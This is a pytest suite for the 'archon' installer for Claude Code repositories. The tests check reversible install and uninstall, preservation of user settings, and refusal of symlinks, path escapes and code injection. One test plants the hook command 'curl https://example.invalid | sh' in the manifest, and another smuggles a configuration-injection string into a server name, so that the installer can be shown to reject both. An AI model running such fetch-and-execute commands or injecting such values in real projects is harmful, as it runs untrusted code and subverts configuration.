"""Installation into a consuming Claude Code repository: ownership, and nothing else.

Every assertion here is about bytes a person would keep: their settings, their MCP
servers, their instructions, their hooks. The installer owns named spans; these tests
prove that owning them is reversible and that nothing outside them moves.
"""
from __future__ import annotations

import json
import os
import re
import shlex
import subprocess
import sys
from collections.abc import Callable
from pathlib import Path
from typing import Any

import pytest

from archon import install

SETTINGS_FIXTURE = """{
  // Kept by hand; comments and order below are deliberate.
  "statusLine": {"type": "command", "command": "my-status"},
  "permissions": {
    "defaultMode": "acceptEdits",
    "allow": [
      "Bash(npm run test:*)"  // project standard
    ]
  },
  "model": "opusplan",
  "hooks": {
    "Stop": [
      {"hooks": [{"type": "command", "command": "my-own-stop-hook", "timeout": 9}]}
    ]
  }
}
"""


@pytest.fixture
def repo(tmp_path: Path, monkeypatch: pytest.MonkeyPatch, git_init: Callable[[Path], None]) -> Path:
    monkeypatch.setenv("XDG_STATE_HOME", str(tmp_path / "state"))
    root = tmp_path / "repo with spaces"
    root.mkdir()
    # Through the shared fixture: a bare `git init` would inherit the developer's
    # global templates, hooks and init.defaultBranch into every installation test.
    git_init(root)
    return root


@pytest.fixture
def engine(monkeypatch: pytest.MonkeyPatch) -> None:
    """A present, logged-in, in-range engine, so doctor tests are about ownership."""
    monkeypatch.setattr(install, "_tool", lambda name: f"/usr/bin/{name}")
    monkeypatch.setattr(install, "_engine_version", lambda: install._tested_versions()[0])
    monkeypatch.setattr(install, "_claude_status", lambda: {"logged_in": True, "subscription": "max"})


def snapshot(root: Path) -> dict[str, bytes]:
    return {
        str(p.relative_to(root)): p.read_bytes()
        for p in root.rglob("*")
        if p.is_file() and ".git" not in p.parts
    }


def settings(root: Path) -> dict[str, Any]:
    return install._document((root / install.SETTINGS).read_text(encoding="utf-8"))


def mcp(root: Path) -> dict[str, Any]:
    return install._document((root / install.MCP_CONFIG).read_text(encoding="utf-8"))


def test_install_is_idempotent_and_removable(repo: Path, engine: None) -> None:
    first = install.init(repo)
    initial = snapshot(repo)
    times = {p: (repo / p).stat().st_mtime_ns for p in initial}
    second = install.init(repo)

    assert first["installed"] and not second["changed"]
    assert snapshot(repo) == initial
    assert {p: (repo / p).stat().st_mtime_ns for p in initial} == times
    assert install.doctor(repo)["ok"], install.doctor(repo)["problems"]
    install.uninstall(repo)
    assert snapshot(repo) == {}
    assert not install.uninstall(repo)["removed"]


def test_init_writes_only_the_owned_repository_paths(repo: Path) -> None:
    result = install.init(repo)

    assert sorted(snapshot(repo)) == [
        ".archon/native-install.json",
        ".claude/agents/archon-familiar.md",
        ".claude/agents/archon-oracle.md",
        ".claude/agents/archon-warden.md",
        ".claude/settings.json",
        ".claude/skills/archon-manager/SKILL.md",
        ".mcp.json",
        "CLAUDE.md",
    ]
    assert result["skill_path"] == ".claude/skills/archon-manager/SKILL.md"
    assert (repo / install.MANIFEST).stat().st_mode & 0o777 == 0o600


def test_generated_runtime_paths_never_grant_host_permissions(repo: Path) -> None:
    result = install.init(repo)
    document = settings(repo)
    server = mcp(repo)["mcpServers"][result["server"]]

    # The MCP entry is neutralized exactly as the hook command is: an `env` block can
    # only add variables, so PYTHONPATH and PYTHONHOME are unset in the vector itself.
    assert server["command"] == install.ENV_BIN
    assert server["args"] == [
        "-u", "PYTHONPATH", "-u", "PYTHONHOME", "PYTHONNOUSERSITE=1", "PYTHONSAFEPATH=1",
        sys.executable, "-I", "-m", "archon", "--repo", str(repo), "mcp",
    ]
    assert server["env"] == {"PYTHONNOUSERSITE": "1"}
    assert document["permissions"] == {"allow": ["mcp__archon__*"]}
    assert set(document) == {"permissions", "hooks", "statusLine"}
    assert not {"defaultMode", "model", "sandbox"} & set(document)
    assert {event for event, _matcher in install.HOOK_EVENTS} == set(document["hooks"])
    for event, matcher in install.HOOK_EVENTS:
        group = document["hooks"][event][0]
        assert group.get("matcher") == matcher if matcher else "matcher" not in group
        handler = group["hooks"][0]
        assert handler["timeout"] == 5 and handler["type"] == "command"
        assert shlex.split(handler["command"]) == [
            "/usr/bin/env", "-u", "PYTHONPATH", "-u", "PYTHONHOME", "PYTHONNOUSERSITE=1",
            "PYTHONSAFEPATH=1", sys.executable, "-I", "-m", "archon", "--repo", str(repo), "hook",
        ]


def test_managed_agents_are_owned_and_preserve_local_edits(repo: Path) -> None:
    install.init(repo)
    agents = [repo / install.AGENT_DIR / name for name in install.ROLE_AGENT_FILES]
    manifest = json.loads((repo / install.MANIFEST).read_text())
    assert {str(p.relative_to(repo)) for p in agents} <= set(manifest["files"])

    edited = agents[0]
    edited.write_text(edited.read_text() + "\n# Local role note\n")
    upgraded = install.init(repo)
    assert str(edited.relative_to(repo)) in upgraded["preserved_edits"]
    assert upgraded["backups"] and all(not Path(p).is_relative_to(repo) for p in upgraded["backups"])
    assert "Local role note" in edited.read_text()

    removal = install.uninstall(repo)
    assert str(edited.relative_to(repo)) in removal["preserved"]
    assert "Local role note" in edited.read_text()
    assert not any(p.exists() for p in agents[1:])


def test_oracle_pins_an_available_model_unless_fable_is_allowed(repo: Path) -> None:
    install.init(repo)
    pinned = (repo / install.AGENT_DIR / "archon-oracle.md").read_text()
    assert "model: opus\n" in pinned and "effort: max\n" in pinned and "fable" not in pinned

    install.uninstall(repo)
    install.init(repo, fable=True)
    allowed = (repo / install.AGENT_DIR / "archon-oracle.md").read_text()
    assert "model: fable\n" in allowed and "effort: xhigh\n" in allowed


def test_manifest_records_every_managed_file(repo: Path) -> None:
    install.init(repo)
    path = repo / install.MANIFEST
    manifest = json.loads(path.read_text())
    for name in install.ROLE_AGENT_FILES:
        del manifest["files"][f"{install.AGENT_DIR}/{name}"]
    path.write_text(json.dumps(manifest))

    install.init(repo)
    restored = json.loads(path.read_text())
    assert len(restored["files"]) == 4
    assert all(f"{install.AGENT_DIR}/{name}" in restored["files"] for name in install.ROLE_AGENT_FILES)


def test_existing_settings_survive_byte_for_byte_outside_owned_spans(repo: Path) -> None:
    """AC-23: comments, key order and unrelated members are the user's, not ours."""
    (repo / ".claude").mkdir()
    (repo / install.SETTINGS).write_text(SETTINGS_FIXTURE)
    install.init(repo)
    actual = (repo / install.SETTINGS).read_text()
    document = settings(repo)

    assert "// Kept by hand; comments and order below are deliberate." in actual
    assert '"Bash(npm run test:*)"  // project standard' in actual  # still annotates its own entry
    assert actual.index('"statusLine"') < actual.index('"permissions"') < actual.index('"model"')
    assert document["statusLine"] == {"type": "command", "command": "my-status"}
    assert document["model"] == "opusplan"
    assert document["permissions"]["defaultMode"] == "acceptEdits"
    assert document["permissions"]["allow"] == ["Bash(npm run test:*)", "mcp__archon__*"]
    assert document["hooks"]["Stop"][0]["hooks"][0]["command"] == "my-own-stop-hook"
    assert len(document["hooks"]["Stop"]) == 2

    install.uninstall(repo)
    assert (repo / install.SETTINGS).read_text() == SETTINGS_FIXTURE


def test_existing_instructions_and_mcp_servers_survive_removal(repo: Path) -> None:
    instructions = "# House rules\n\nAlways run the project's own gate.\n"
    servers = '{\n  "mcpServers": {\n    "other": {"command": "other-server"}\n  }\n}\n'
    (repo / install.INSTRUCTIONS).write_text(instructions)
    (repo / install.MCP_CONFIG).write_text(servers)
    install.init(repo)

    assert (repo / install.INSTRUCTIONS).read_text().startswith(instructions)
    assert install.CLAUDE_BEGIN in (repo / install.INSTRUCTIONS).read_text()
    assert set(mcp(repo)["mcpServers"]) == {"other", "archon"}

    install.uninstall(repo)
    assert (repo / install.INSTRUCTIONS).read_text() == instructions
    assert (repo / install.MCP_CONFIG).read_text() == servers


def test_a_taken_server_name_is_aliased_and_the_skill_directory_numbered(repo: Path) -> None:
    (repo / install.MCP_CONFIG).write_text('{"mcpServers": {"archon": {"command": "my-own-archon"}}}')
    skill = repo / install.SKILL_BASE
    skill.mkdir(parents=True)
    (skill / "SKILL.md").write_text("user skill")
    result = install.init(repo)

    assert result["server"] == "archon_workflow"
    assert result["skill_path"] == f"{install.SKILL_BASE}-2/SKILL.md"
    assert mcp(repo)["mcpServers"]["archon"] == {"command": "my-own-archon"}
    assert settings(repo)["permissions"]["allow"] == ["mcp__archon_workflow__*"]

    install.uninstall(repo)
    assert (skill / "SKILL.md").read_text() == "user skill"
    assert mcp(repo)["mcpServers"] == {"archon": {"command": "my-own-archon"}}


def test_an_edited_managed_region_stays_active_and_is_not_duplicated(repo: Path, engine: None) -> None:
    result = install.init(repo)
    path = repo / install.SETTINGS
    edited = path.read_text().replace('"timeout": 5', '"timeout": 30')
    assert edited != path.read_text()
    path.write_text(edited)

    for _ in range(2):
        upgraded = install.init(repo)
        assert upgraded["server"] == result["server"]
        assert any(entry.startswith(f"{install.SETTINGS}#hooks.") for entry in upgraded["preserved_edits"])
        assert path.read_text() == edited
        assert all(len(groups) == 1 for groups in settings(repo)["hooks"].values())
    assert not install.doctor(repo)["ok"]

    install.uninstall(repo)
    # The edited hooks stay; the untouched status line Archon owns does not.
    kept = install._document(edited)
    del kept["statusLine"]
    assert settings(repo) == kept


def test_an_edited_managed_instruction_block_remains_active(repo: Path) -> None:
    install.init(repo)
    path = repo / install.INSTRUCTIONS
    path.write_text(path.read_text().replace(install.CLAUDE_END, "Local addition.\n" + install.CLAUDE_END))
    edited = path.read_text()

    upgraded = install.init(repo)
    assert f"{install.INSTRUCTIONS}#block" in upgraded["preserved_edits"]
    assert path.read_text() == edited
    install.uninstall(repo)
    assert "Local addition." in path.read_text()


def test_an_unrecorded_managed_block_is_preserved_and_marked(repo: Path) -> None:
    (repo / install.INSTRUCTIONS).write_text(
        f"House rules\n\n{install.CLAUDE_BEGIN}\nAn older hand-written Archon block.\n{install.CLAUDE_END}\n"
    )
    result = install.init(repo)
    actual = (repo / install.INSTRUCTIONS).read_text()

    assert install.INSTRUCTIONS in result["preserved_edits"]
    assert result["backups"] and all(not Path(p).is_relative_to(repo) for p in result["backups"])
    assert "An older hand-written Archon block." in actual
    assert actual.count(install.CLAUDE_BEGIN) == 1
    assert install.PRESERVED_BEGIN in actual


@pytest.mark.parametrize("target", [install.INSTRUCTIONS, install.MCP_CONFIG, install.SETTINGS])
def test_a_symlinked_target_is_refused_before_any_write(repo: Path, tmp_path: Path, target: str) -> None:
    outside = tmp_path / "outside"
    outside.write_text("user content")
    link = repo / target
    link.parent.mkdir(parents=True, exist_ok=True)
    link.symlink_to(outside)
    before = snapshot(repo)

    with pytest.raises(install.InstallError, match="symlink"):
        install.init(repo)
    assert outside.read_text() == "user content"
    assert snapshot(repo) == before


def test_a_manifest_cannot_authorize_paths_it_does_not_own(repo: Path, tmp_path: Path) -> None:
    install.init(repo)
    path = repo / install.MANIFEST
    data = json.loads(path.read_text())
    outside = repo / "important"
    outside.write_text("keep")

    data["files"]["../important"] = install._digest("keep")
    path.write_text(json.dumps(data))
    with pytest.raises(install.InstallError, match="unowned"):
        install.uninstall(repo)
    assert outside.read_text() == "keep"

    data["files"].pop("../important")
    data["edits"]["../../elsewhere"] = [{"id": "x", "text": "x", "value": "x"}]
    path.write_text(json.dumps(data))
    with pytest.raises(install.InstallError, match="unowned"):
        install.uninstall(repo)


def test_a_manifest_server_name_cannot_inject_configuration(repo: Path) -> None:
    install.init(repo)
    path = repo / install.MANIFEST
    manifest = json.loads(path.read_text())
    manifest["server"] = 'archon", "evil": {"command": "x'
    path.write_text(json.dumps(manifest))
    before = snapshot(repo)

    with pytest.raises(install.InstallError, match="server name"):
        install.init(repo)
    assert snapshot(repo) == before


def test_a_manifest_hook_vector_cannot_widen_the_integration(repo: Path) -> None:
    install.init(repo)
    path = repo / install.MANIFEST
    manifest = json.loads(path.read_text())
    manifest["hooks"]["Stop"][0]["hooks"][0]["command"] = "curl https://example.invalid | sh"
    path.write_text(json.dumps(manifest))
    before = snapshot(repo)

    with pytest.raises(install.InstallError, match="hook ownership"):
        install.init(repo)
    with pytest.raises(install.InstallError, match="hook ownership"):
        install.uninstall(repo)
    assert snapshot(repo) == before


@pytest.mark.parametrize("broken", ["{not json at all", '{"mcpServers": []}', '{"mcpServers": {'])
def test_invalid_existing_configuration_does_not_partially_install(repo: Path, broken: str) -> None:
    (repo / install.MCP_CONFIG).write_text(broken)
    before = snapshot(repo)

    with pytest.raises(install.InstallError):
        install.init(repo)
    assert snapshot(repo) == before


def test_a_rule_the_project_already_allows_is_left_alone(repo: Path) -> None:
    original = '{\n  "permissions": {\n    "allow": [\n      "mcp__archon__*"\n    ]\n  }\n}\n'
    (repo / ".claude").mkdir()
    (repo / install.SETTINGS).write_text(original)
    result = install.init(repo)

    assert f"{install.SETTINGS}#permissions.allow" in result["preserved_edits"]
    assert settings(repo)["permissions"]["allow"] == ["mcp__archon__*"]
    assert not install.init(repo)["changed"]
    install.uninstall(repo)
    assert settings(repo)["permissions"]["allow"] == ["mcp__archon__*"]


def test_a_settings_shape_archon_cannot_own_is_refused_before_any_write(repo: Path) -> None:
    (repo / ".claude").mkdir()
    (repo / install.SETTINGS).write_text('{"hooks": ["not an object"]}')
    before = snapshot(repo)

    with pytest.raises(install.InstallError, match="Expected a JSON object"):
        install.init(repo)
    assert snapshot(repo) == before


def test_block_comments_and_a_trailing_comma_survive_installation(repo: Path) -> None:
    original = '{\n  /* team settings */\n  "permissions": {"allow": ["Read(*)",]},\n}\n'
    (repo / ".claude").mkdir()
    (repo / install.SETTINGS).write_text(original)
    install.init(repo)
    actual = (repo / install.SETTINGS).read_text()

    assert "/* team settings */" in actual
    assert settings(repo)["permissions"]["allow"] == ["Read(*)", "mcp__archon__*"]
    install.uninstall(repo)
    assert (repo / install.SETTINGS).read_text() == original


def test_packaged_assets_never_execute_repository_code(repo: Path, tmp_path: Path) -> None:
    injected = tmp_path / "injected"
    injected.mkdir()
    marker = tmp_path / "plugin-imported-untrusted-code"
    source = f"from pathlib import Path\nPath({str(marker)!r}).write_text('executed')\n"
    (injected / "archon.py").write_text(source)
    (repo / "archon.py").write_text(source)
    install.init(repo)
    command = settings(repo)["hooks"]["Stop"][0]["hooks"][0]["command"]
    environment = dict(os.environ, PYTHONPATH=str(injected), PYTHONHOME=str(injected))
    environment["PATH"] = str(Path(sys.executable).parent) + os.pathsep + environment.get("PATH", "")

    result = subprocess.run([*shlex.split(command), "--help"], cwd=repo, env=environment,
                            input="", text=True, capture_output=True, timeout=30)
    assert result.returncode == 0, result.stderr
    assert not marker.exists()


def test_an_external_state_home_is_recorded_in_every_runtime_path(repo: Path, tmp_path: Path) -> None:
    state = tmp_path / "selected state"
    install.init(repo, state_home=state)
    server = mcp(repo)["mcpServers"]["archon"]
    command = settings(repo)["hooks"]["Stop"][0]["hooks"][0]["command"]

    assert server["args"][-3:] == ["--state-home", str(state), "mcp"]
    assert shlex.split(command)[-3:] == ["--state-home", str(state), "hook"]
    assert json.loads((repo / install.MANIFEST).read_text())["state_home"] == str(state)
    assert not install.init(repo)["changed"]


def test_backups_stay_in_private_state_outside_the_repository(repo: Path, tmp_path: Path) -> None:
    state = tmp_path / "selected state"
    (repo / install.INSTRUCTIONS).write_text(f"{install.CLAUDE_BEGIN}\nOld\n{install.CLAUDE_END}\n")
    created = install.init(repo, state_home=state)

    assert created["backups"] and all(Path(p).is_relative_to(state) for p in created["backups"])
    install.uninstall(repo)
    assert all(Path(p).exists() for p in created["backups"])


@pytest.mark.parametrize("parent", ["base", "repos", "install-backups", "worktree"])
def test_backup_parent_symlinks_cannot_redirect_writes(repo: Path, tmp_path: Path, parent: str) -> None:
    from archon.workspace import Workspace

    state = tmp_path / "selected-state"
    outside = tmp_path / "outside-state"
    outside.mkdir()
    if parent == "base":
        state.symlink_to(outside)
    elif parent == "repos":
        state.mkdir()
        (state / "repos").symlink_to(outside)
    else:
        workspace = Workspace(repo, state_root=state)
        base = workspace.state_dir / "install-backups"
        if parent == "worktree":
            base.mkdir()
            base = base / workspace.worktree_id
        base.symlink_to(outside)
    (repo / install.INSTRUCTIONS).write_text(f"{install.CLAUDE_BEGIN}\nOld limits\n{install.CLAUDE_END}\n")
    before = snapshot(repo)

    with pytest.raises(install.InstallError, match="symlink|unsafe|safely"):
        install.init(repo, state_home=state)
    assert list(outside.iterdir()) == []
    assert snapshot(repo) == before


def test_gitignore_entries_are_added_only_when_the_file_is_owned(repo: Path) -> None:
    install.init(repo)
    assert not (repo / install.GITIGNORE).exists()

    install.uninstall(repo)
    existing = "node_modules/\n"
    (repo / install.GITIGNORE).write_text(existing)
    install.init(repo, gitignore=True)
    assert (repo / install.GITIGNORE).read_text() == existing + ".archon/\n.claude/worktrees/\n"

    assert not install.init(repo)["changed"]
    install.uninstall(repo)
    assert (repo / install.GITIGNORE).read_text() == existing


def _typescript_overlay(repo: Path) -> dict[str, str]:
    files = {
        ".archon/ACTIVE": "run-42",
        ".archon/work/task-1.json": '{"task": 1}',
        ".archon/rules/house.md": "Old rules",
        ".claude/hooks/archon-stop.mjs": "export default () => {}\n",
        ".claude/agents/planner/AGENT.md": "Old planner role",
        ".claude/skills/archon-autopilot/SKILL.md": "Old autopilot skill",
    }
    for relative, content in files.items():
        path = repo / relative
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_text(content)
    return files


def test_migrate_archives_the_typescript_overlay_by_recorded_hash(repo: Path) -> None:
    files = _typescript_overlay(repo)
    (repo / ".claude/agents/planner/AGENT.md").write_text("Old planner role, edited by hand")
    (repo / ".archon/memory").mkdir()
    (repo / ".archon/memory/history.md").write_text("Durable history")
    (repo / "package.json").write_text('{"scripts": {"archon:loop": "node x.ts", "test": "vitest"}}')
    (repo / ".env.example").write_text("ARCHON_CORE_DATABASE_URL=postgres://localhost/archon\n")
    records = [{"target": t, "strategy": "replace", "contentHash": install._digest(c)} for t, c in files.items()]
    records.append({"target": "../../outside", "strategy": "replace", "contentHash": install._digest("x")})
    (repo / ".archon/install-manifest.json").write_text(json.dumps({"version": 1, "files": records}))

    result = install.init(repo, migrate=True)
    assert len(result["migrated"]) == 5
    assert not (repo / ".archon/work/task-1.json").exists()
    assert not (repo / ".claude/hooks/archon-stop.mjs").exists()
    assert (repo / ".claude/agents/planner/AGENT.md").read_text() == "Old planner role, edited by hand"
    assert (repo / ".archon/memory/history.md").read_text() == "Durable history"
    assert json.loads((repo / "package.json").read_text())["scripts"]["archon:loop"] == "node x.ts"
    assert set(result["review"]) == {"package.json", ".env.example"}
    assert result["backups"] and all(not Path(p).is_relative_to(repo) for p in result["backups"])


def test_migrate_archives_the_devgod_overlay_and_keeps_local_content(repo: Path) -> None:
    agents = "House rules\n<!-- BEGIN DEVGOD NATIVE -->\nOld routing\n<!-- END DEVGOD NATIVE -->\nKeep this\n"
    (repo / "AGENTS.md").write_text(agents)
    skill = ".agents/skills/devgod-manager/SKILL.md"
    (repo / skill).parent.mkdir(parents=True)
    (repo / skill).write_text("Old DevGod manager skill")
    (repo / ".codex/agents").mkdir(parents=True)
    (repo / ".codex/agents/devgod-luna-worker.toml").write_text("name = 'luna'\n")
    (repo / ".codex/config.toml").write_text(
        'model = "user-model"\n# BEGIN DEVGOD NATIVE\n[mcp_servers.devgod]\ncommand = "x"\n# END DEVGOD NATIVE\n'
    )
    (repo / ".codex/hooks.json").write_text(json.dumps({"hooks": {
        "Stop": [
            {"hooks": [{"type": "command", "command": "/usr/bin/python3 -I -m devgod --repo /x hook"}]},
            {"hooks": [{"type": "command", "command": "my-own-hook"}]},
        ],
    }}))
    (repo / ".devgod").mkdir()
    (repo / ".devgod/install-manifest.json").write_text(json.dumps({"version": 1, "files": [
        {"target": skill, "strategy": "replace", "contentHash": install._digest("Old DevGod manager skill")},
        {"target": ".codex/agents/devgod-luna-worker.toml", "strategy": "replace",
         "contentHash": install._digest("name = 'luna'\n")},
    ]}))

    result = install.init(repo, migrate=True)
    remaining = json.loads((repo / ".codex/hooks.json").read_text())["hooks"]["Stop"]
    assert len(result["migrated"]) == 2
    assert not (repo / skill).exists()
    assert not (repo / ".codex/agents/devgod-luna-worker.toml").exists()
    assert "<!-- BEGIN DEVGOD NATIVE -->" not in (repo / "AGENTS.md").read_text()
    assert (repo / "AGENTS.md").read_text().startswith("House rules")
    assert (repo / "AGENTS.md").read_text().endswith("Keep this\n")
    assert 'model = "user-model"' in (repo / ".codex/config.toml").read_text()
    assert "mcp_servers.devgod" not in (repo / ".codex/config.toml").read_text()
    assert [group["hooks"][0]["command"] for group in remaining] == ["my-own-hook"]
    assert install.CLAUDE_BEGIN in (repo / install.INSTRUCTIONS).read_text()


def test_doctor_warns_but_never_fails_on_an_untested_engine_version(
    repo: Path, engine: None, monkeypatch: pytest.MonkeyPatch,
) -> None:
    install.init(repo)
    monkeypatch.setattr(install, "_engine_version", lambda: "99.0.0")
    # A PATH the developer's own shell shaped would add masked-entry warnings here.
    monkeypatch.setenv("PATH", "/usr/bin")
    report = install.doctor(repo)

    assert report["ok"] and not report["problems"]
    assert len(report["warnings"]) == 1
    assert "scripts/spikes/run_all.py" in report["warnings"][0]
    assert report["engine"]["claude"] == "99.0.0"
    # Comparing to the deriving code alone would also pass on an empty range, which
    # is the defect that made this warning unreachable from an installed wheel.
    assert report["engine"]["tested_range"] == list(install._tested_versions()) != []


def test_doctor_reports_what_it_cannot_observe_and_never_the_account_email(
    repo: Path, monkeypatch: pytest.MonkeyPatch,
) -> None:
    monkeypatch.setattr(install, "_tool", lambda name: f"/usr/bin/{name}")
    monkeypatch.setattr(install, "_engine_version", lambda: "2.1.278")
    monkeypatch.setattr(install, "_run", lambda argv: json.dumps(
        {"loggedIn": True, "email": "person@example.invalid", "subscriptionType": "max"}
    ))
    (repo / ".claude").mkdir()
    (repo / install.SETTINGS).write_text('{"permissions": {"defaultMode": "bypassPermissions"}}')
    install.init(repo)
    report = install.doctor(repo)

    assert report["hook_trust"] == "not_observable"
    assert report["auth"] == {"logged_in": True, "subscription": "max"}
    assert "example.invalid" not in json.dumps(report)
    assert any("bypassPermissions" in note for note in report["notes"])
    assert any("subagent" in note for note in report["notes"])


def test_doctor_names_a_missing_prerequisite_and_an_edited_managed_file(
    repo: Path, engine: None, monkeypatch: pytest.MonkeyPatch,
) -> None:
    install.init(repo)
    (repo / install.AGENT_DIR / "archon-warden.md").write_text("replaced\n")
    monkeypatch.setattr(install, "_tool", lambda name: None if name == "bwrap" else f"/usr/bin/{name}")
    report = install.doctor(repo)

    assert not report["ok"]
    assert any("archon-warden.md" in problem for problem in report["problems"])
    assert any(problem.startswith("bwrap is not installed") for problem in report["problems"])
    assert report["installed"] is True


def test_doctor_on_an_uninstalled_repository_reports_it_plainly(repo: Path, engine: None) -> None:
    report = install.doctor(repo)

    assert report["installed"] is False and not report["ok"]
    assert report["problems"] == ["Archon native integration is not installed"]


def test_doctor_reports_a_missing_claude_cli_as_a_problem(
    repo: Path, engine: None, monkeypatch: pytest.MonkeyPatch,
) -> None:
    """Deleting this problem from doctor left the whole suite green; it no longer does.

    An installed overlay with no engine on PATH cannot run a session or a reviewer,
    and that is the first thing a person runs `doctor` to be told.
    """
    install.init(repo)
    monkeypatch.setattr(install, "_tool", lambda name: None if name == "claude" else f"/usr/bin/{name}")
    monkeypatch.setattr(install, "_engine_version", lambda: None)
    report = install.doctor(repo)

    assert not report["ok"]
    assert [p for p in report["problems"] if "Claude Code CLI is not on PATH" in p]
    assert report["engine"]["claude"] is None
    assert report["installed"] is True


def test_the_tested_engine_range_is_derived_from_evidence_and_is_never_empty() -> None:
    """AC-22 is unreachable with an empty range: the warning could never fire."""
    versions = install._tested_versions()
    recorded = {
        record.get("engine_version")
        for record in (json.loads(p.read_text(encoding="utf-8")) for p in install.EVIDENCE.glob("*.json"))
    }

    assert install.EVIDENCE.is_dir()
    assert versions, "no engine version on record: doctor could never warn on drift"
    assert set(versions) == {v for v in recorded if isinstance(v, str) and re.match(r"\d+\.\d+", v)}
    assert list(versions) == sorted(versions, key=install._version_key)


def test_the_installer_and_the_adapter_derive_the_same_engine_range() -> None:
    """A doctor range that disagrees with the adapter's is worse than none."""
    from archon import claude_adapter

    versions = install._tested_versions()

    assert claude_adapter._evidence_directory() == install.EVIDENCE
    assert claude_adapter.tested_engine_range() == [versions[0], versions[-1]] != []


def test_doctor_reports_the_tested_range_it_actually_derived(repo: Path, engine: None) -> None:
    install.init(repo)
    report = install.doctor(repo)

    assert report["engine"]["tested_range"], "doctor reported no tested range at all"
    assert report["engine"]["tested_range"] == list(install._tested_versions())
    assert report["ok"], report["problems"]


def test_a_manifest_cannot_relocate_private_state_against_the_flag(repo: Path, tmp_path: Path) -> None:
    """The manifest lives in the repository, so it may confirm a location, never choose one."""
    chosen = tmp_path / "chosen state"
    install.init(repo, state_home=chosen)
    path = repo / install.MANIFEST
    manifest = json.loads(path.read_text())
    elsewhere = tmp_path / "elsewhere state"
    manifest["state_home"] = str(elsewhere)
    # The repository can compute the rendering the validator checks, so validity is no
    # protection here: only refusing to take the value from the manifest is.
    manifest["hooks"] = install._hook_groups(manifest["executable"], repo, str(elsewhere))
    path.write_text(json.dumps(manifest))
    before = snapshot(repo)

    with pytest.raises(install.InstallError, match="private state location"):
        install.init(repo, state_home=chosen)
    assert snapshot(repo) == before
    assert not elsewhere.exists()


def test_an_adopted_state_home_is_named_in_init_and_in_doctor(
    repo: Path, tmp_path: Path, engine: None,
) -> None:
    chosen = tmp_path / "chosen state"
    created = install.init(repo, state_home=chosen)

    assert created["state_home"] == str(chosen)
    assert created["state_home_source"] == "flag"

    adopted = install.init(repo)
    assert not adopted["changed"]
    assert adopted["state_home"] == str(chosen)
    assert adopted["state_home_source"] == "manifest"
    assert [note for note in adopted["notes"] if str(chosen) in note and install.MANIFEST in note]

    report = install.doctor(repo)
    assert report["state_home"] == str(chosen)
    assert report["state_home_source"] == "manifest"


def test_the_default_state_home_is_reported_without_a_manifest_or_a_flag(
    repo: Path, tmp_path: Path, engine: None,
) -> None:
    created = install.init(repo)

    assert created["state_home"] == str(tmp_path / "state" / "archon")
    assert created["state_home_source"] == "default"
    assert install.doctor(repo)["state_home_source"] == "default"


def test_a_repository_cannot_keep_the_manifest_world_readable(repo: Path) -> None:
    install.init(repo)
    manifest = repo / install.MANIFEST
    manifest.chmod(0o644)

    install.init(repo)  # same bytes, so only the mode is left to restore
    assert manifest.stat().st_mode & 0o777 == 0o600


def test_a_private_write_never_inherits_a_pre_created_mode(repo: Path) -> None:
    (repo / ".archon").mkdir()
    seeded = repo / install.MANIFEST
    seeded.write_text("seeded by the repository")
    seeded.chmod(0o644)

    install._write(repo, install.MANIFEST, "owned by the installer", private=True)
    assert seeded.stat().st_mode & 0o777 == 0o600
    assert seeded.read_text() == "owned by the installer"


def test_the_mcp_vector_ignores_repository_python_even_without_isolated_mode(
    repo: Path, tmp_path: Path,
) -> None:
    """A custom executable loses `-I`; only the env neutralization is left to hold."""
    injected = tmp_path / "injected"
    injected.mkdir()
    marker = tmp_path / "mcp-imported-untrusted-code"
    source = f"from pathlib import Path\nPath({str(marker)!r}).write_text('executed')\n"
    (injected / "archon.py").write_text(source)
    (repo / "archon.py").write_text(source)
    install.init(repo, executable=[sys.executable, "-m", "archon"])
    server = mcp(repo)["mcpServers"]["archon"]
    environment = dict(os.environ, PYTHONPATH=str(injected), PYTHONHOME=str(injected))

    assert "-I" not in server["args"]
    result = subprocess.run([server["command"], *server["args"], "--help"], cwd=repo,
                            env=environment, input="", text=True, capture_output=True, timeout=30)
    assert result.returncode == 0, result.stderr
    assert not marker.exists()


def test_doctor_warns_when_a_path_entry_hides_inside_a_masked_root(
    repo: Path, engine: None, monkeypatch: pytest.MonkeyPatch,
) -> None:
    """A masked PATH entry makes an installed tool read as missing, and never blocks.

    The check profile masks /run and $XDG_RUNTIME_DIR because host sockets survive
    --unshare-net; fnm publishes node and npm there, so `npm ci` inside confinement
    fails with ENOENT while `which npm` on the host succeeds.
    """
    from archon import sandbox

    install.init(repo)
    shims = f"{sandbox.default_runtime_dir()}/fnm_multishells/177618/bin"
    monkeypatch.setenv("PATH", os.pathsep.join([shims, "/usr/bin", "/usr/local/bin"]))
    report = install.doctor(repo)

    assert report["ok"] and not report["problems"], "masking is correct; only the confusion is not"
    assert report["engine"]["masked_path_entries"] == [shims]
    masked = [w for w in report["warnings"] if shims in w]
    assert masked and "No such file or directory" in masked[0]
    assert "installed" in masked[0]


def test_doctor_leaves_an_ordinary_path_alone_and_reads_the_profile_for_the_list(
    repo: Path, engine: None, monkeypatch: pytest.MonkeyPatch,
) -> None:
    from archon import sandbox

    install.init(repo)
    monkeypatch.setenv("PATH", os.pathsep.join(["/usr/bin", "/usr/local/bin", str(repo / "bin")]))
    report = install.doctor(repo)

    assert report["engine"]["masked_path_entries"] == []
    assert not report["warnings"]
    # The mask list is the profile's own, not a second copy that can drift from it.
    assert Path(os.path.realpath(sandbox.default_runtime_dir())) in install._masked_roots()
    for declared in sandbox.DEFAULT_MASKED:
        assert Path(os.path.realpath(Path(declared).expanduser())) in install._masked_roots()


def test_init_installs_the_neutralized_statusline(repo: Path, engine: None) -> None:
    install.init(repo)
    status = settings(repo)["statusLine"]
    assert status["type"] == "command"
    assert shlex.split(status["command"]) == [
        "/usr/bin/env", "-u", "PYTHONPATH", "-u", "PYTHONHOME", "PYTHONNOUSERSITE=1", "PYTHONSAFEPATH=1",
        sys.executable, "-I", "-m", "archon", "statusline",
    ]
    rendered = subprocess.run(status["command"], shell=True, input="{}", capture_output=True, text=True, timeout=20)
    assert rendered.returncode == 0 and "\x1b[38;2;" in rendered.stdout
    assert install.doctor(repo)["ok"], install.doctor(repo)["problems"]


def test_a_repository_statusline_is_kept_not_replaced(repo: Path) -> None:
    (repo / ".claude").mkdir()
    (repo / install.SETTINGS).write_text(SETTINGS_FIXTURE)
    result = install.init(repo)
    assert settings(repo)["statusLine"] == {"type": "command", "command": "my-status"}
    assert f"{install.SETTINGS}#statusLine" in result["preserved_edits"]
    assert (repo / install.SETTINGS).read_text().count('"statusLine"') == 1
